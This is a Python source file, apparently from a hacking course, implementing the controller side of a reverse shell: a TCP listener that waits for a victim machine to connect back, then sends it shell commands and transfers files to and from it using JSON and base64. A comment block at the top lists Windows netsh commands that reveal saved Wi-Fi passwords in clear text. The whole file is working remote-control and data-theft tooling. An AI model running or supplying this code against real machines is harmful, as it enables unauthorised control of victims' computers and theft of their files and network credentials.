#!/usr/bin/env/python

"""
Windows commands:
netsh wlan show profile # To show all the wlan conections that have ben used by the machine
netsh wlan show profile <wifi_name>  # To get the information from a particular network
netsh wlan show profile <wifi_name> key=clear # It shows also the wifi password of the network
"""

import socket
import json
import base64

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # SOCK_STREAM creates a TCP connection
        # To change an option in a socket object we use setsockopt.
        # We'll modify SOL_SOCKET's option O_REUSEADDR.
        # This will allow us to reuse sockets so if the connection drops, the sockets can be reused
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # To listen for incoming connections
        listener.bind((ip, port))# Instead of connecting to a destination, we're binding our socket to our computer
        listener.listen(0) # We set te backlog to 0, that is the number of connections that can be queued before the system starts refusing
        print("[+] Wainting for incoming connections")
        self.connection, adress = listener.accept() # accept() returns two values:
        # the 1st is the connection that we can use to send or recieve data,
        # the 2nd is the address that is bound to this connection
        print("[+] Got a connection from " + str(adress))

    def reliable_send(self, data):
        """
        It packs data into a json object in order to be sent under TCP protocol
        :param data: data bigger than 1024 bytes to be sent
        """
        json_data = json.dumps(data)
        # json_data = json.dumps(data) # We convert the data into a json object
        # self.connection.send(json_data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        """
        Recieves json data and unwrap it
        :return: unwrapped data
        """
        # json_data = ""
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        #self.connection.send(command)
        #return self.connection.recv(1024)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file: # To read a file as binary
            file.write(base64.b64decode(content)) # To avoid unicode errors we use base64 encoding that translates
                                                  # to characters that json and python can parse
            return "[+] Download succesful."

    def read_file(self, path):
        with open(path, "rb") as file:  # We open a file to be read as binary
            return base64.b64encode(file.read())  # To avoid unicode errors we use base64 encoding that translates
                                                  # to characters that json and python can parse

    def run(self):
        while True:
            # command = raw_input(">> ")
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

            # print(result.decode("ISO-8859-1"))
            print(result)